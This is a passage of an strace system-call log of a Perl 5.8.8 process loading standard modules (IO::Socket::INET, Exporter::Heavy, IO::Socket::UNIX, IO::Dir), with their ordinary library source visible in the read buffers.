$addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
6989  07:16:29.090935 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.090951 stat64("/etc/perl/Exporter/Heavy.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.090965 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.090977 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.090991 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.091004 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.091047 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.091060 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.091088 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.091099 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.091113 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.091125 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.091139 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.091152 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
6989  07:16:29.091173 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
6989  07:16:29.091187 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ae778) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.091199 _llseek(8, 0, [0], SEEK_CUR) = 0
6989  07:16:29.091216 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
6989  07:16:29.091903 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
6989  07:16:29.092202 brk(0x829c000)    = 0x829c000
6989  07:16:29.092448 read(8, "", 4096) = 0
6989  07:16:29.092463 close(8)          = 0
6989  07:16:29.093693 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
6989  07:16:29.098018 _llseek(6, 6496, [6496], SEEK_SET) = 0
6989  07:16:29.098036 _llseek(6, 0, [6496], SEEK_CUR) = 0
6989  07:16:29.098047 close(6)          = 0
6989  07:16:29.098112 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.098129 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.098144 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.098158 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.098172 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.098185 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.098200 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.098212 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.098226 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.098239 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.098253 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.098266 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
6989  07:16:29.098289 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
6989  07:16:29.098305 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9aec28) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.098317 _llseek(6, 0, [0], SEEK_CUR) = 0
6989  07:16:29.098333 brk(0x82bd000)    = 0x82bd000
6989  07:16:29.098349 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
6989  07:16:29.098928 _llseek(6, 1386, [1386], SEEK_SET) = 0
6989  07:16:29.098947 _llseek(6, 0, [1386], SEEK_CUR) = 0
6989  07:16:29.098957 close(6)          = 0
6989  07:16:29.099014 stat64("/etc/perl/IO/Dir.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.099030 stat64("/etc/perl/IO/Dir.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.099044 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.099057 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.099075 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.099088 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.099112 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.099124 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.099138 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.099150 stat64("/usr/share/perl5/IO/Dir.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.099163 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.099176 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
6989  07:16:29.099197 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
6989  07:16:29.099211 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9aec28) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.099223 _llseek(6, 0, [0], SEEK_CUR) = 0
6989  07:16:29.099243 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
6989  07:16:29.099775 stat64("/etc/perl/Tie/Hash.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.099793 stat64("/etc/perl/Tie/Hash.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.099807 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.099821 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.099835 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.099847 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.099861 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.099874 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.099887 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.099899 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.099912 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.099925 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.099938 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.099952 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
6989  07:16:29.099973 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
6989  07:16:29.099988 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ae778) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.099999 _llseek(8, 0, [0], SEEK_CUR) = 0
